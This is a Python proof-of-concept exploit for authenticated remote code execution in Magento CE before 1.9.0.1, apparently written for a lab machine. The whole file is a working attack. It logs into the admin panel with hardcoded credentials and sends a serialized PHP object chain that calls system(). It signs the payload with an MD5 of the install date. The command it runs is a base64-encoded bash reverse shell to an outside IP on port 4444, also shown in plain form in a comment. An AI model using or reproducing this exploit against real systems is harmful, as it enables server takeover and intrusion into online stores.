from hashlib import md5
import requests
import mechanize
import re
import base64
'''
Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution  
网上公开版本已经无法使用 所以使用requests库重新写了个poc
author:FireGhost
date:2023/5/27
'''
if __name__ == '__main__':
    # Command-line args
    target = 'http://10.129.159.15/index.php/admin'
    ''' echo "bash -c ' bash -i >& /dev/tcp/10.10.16.14/4444 0>&1'" |base64    #使用命令生成payload base64编码'''
    command = "echo YmFzaCAtYyAnIGJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuOS80NDQ0IDA+JjEnCg==|base64 -d|sh"  # base64编码由上述命令生成
    # Config.
    #admin username password  使用对应漏洞创建admin账号
    username = 'ypwq'
    password = '123'
    php_function = 'system'  # Note: we can only pass 1 argument to the function
    install_date = 'Wed, 08 May 2019 07:23:09 +0000'  # This needs to be the exact date from /app/etc/local.xml
    # POP chain to pivot into call_user_exec
    payload = 'O:8:\"Zend_Log\":1:{s:11:\"\00*\00_writers\";a:2:{i:0;O:20:\"Zend_Log_Writer_Mail\":4:{s:16:' \
              '\"\00*\00_eventsToMail\";a:3:{i:0;s:11:\"EXTERMINATE\";i:1;s:12:\"EXTERMINATE!\";i:2;s:15:\"' \
              'EXTERMINATE!!!!\";}s:22:\"\00*\00_subjectPrependText\";N;s:10:\"\00*\00_layout\";O:23:\"' \
              'Zend_Config_Writer_Yaml\":3:{s:15:\"\00*\00_yamlEncoder\";s:%d:\"%s\";s:17:\"\00*\00' \
              '_loadedSection\";N;s:10:\"\00*\00_config\";O:13:\"Varien_Object\":1:{s:8:\"\00*\00_data\"' \
              ';s:%d:\"%s\";}}s:8:\"\00*\00_mail\";O:9:\"Zend_Mail\":0:{}}i:1;i:2;}}' % (
                  len(php_function), php_function,
                  len(command), command)
    br = mechanize.Browser()
    # br.set_proxies({"http": "localhost:8080"})
    br.set_handle_robots(False)
    request = br.open(target)
    br.select_form(nr=0)
    # print(br['form_key'])
    data = {
        'form_key': br['form_key'],
        "login[username]": username,
        "login[password]": password
    }
    session = requests.session()  # 实例化session对象
    res = session.post(target, data)
    # print(res.text)
    content = res.text
    url = re.search("ajaxBlockUrl = \'(.*)\'", content)
    url = url.group(1)
    key = re.search("var FORM_KEY = '(.*)'", content)
    key = key.group(1)
    # print(url)
    # print(key)
    data1 = {
        'isAjax': 'false',
        'form_key': key
    }
    res = session.post(url + 'block/tab_orders/period/2y/?isAjax=true', data1)
    # print(res.text)
    tunnel = re.search("src=\"(.*)\?ga=", res.text)
    tunnel = tunnel.group(1)
    # print(tunnel)
    payload = base64.b64encode(payload.encode('utf-8'))
    exp = payload + install_date.encode('utf-8')
    gh = md5(payload + install_date.encode('utf-8')).hexdigest()
    exploit = tunnel + '?ga=' + str(payload, encoding="utf-8") + '&h=' + gh
    # print(exploit)
    res = session.get(exploit)
    print(res.text)

